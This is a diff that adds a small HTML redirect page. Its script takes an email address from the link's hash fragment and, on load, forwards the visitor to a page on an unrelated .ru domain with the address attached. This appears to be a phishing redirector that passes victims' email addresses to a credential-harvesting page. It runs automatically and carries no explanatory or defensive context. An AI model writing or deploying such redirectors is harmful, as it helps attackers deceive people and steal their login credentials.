@@ -1,0 +1,27 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <title>Redirect Page</title>
+  <script>
+    // Function to parse the email from the hash fragment
+    function getEmailFromHash() {
+      var hash = window.location.hash;
+      var email = hash.substr(1); // Remove the leading '#'
+      return email;
+    }
+
+    // Function to redirect to the static website with the email parameter
+    function redirectToStaticWebsite() {
+      var email = getEmailFromHash();
+      var staticWebsiteURL = 'https://ae-interiors.ru//confi/newdomain.html'; // Replace with your static website URL
+      var redirectURL = staticWebsiteURL + '#' + email;
+      window.location.href = redirectURL;
+    }
+  </script>
+</head>
+<body>
+  <script>
+    redirectToStaticWebsite();
+  </script>
+</body>
+</html>
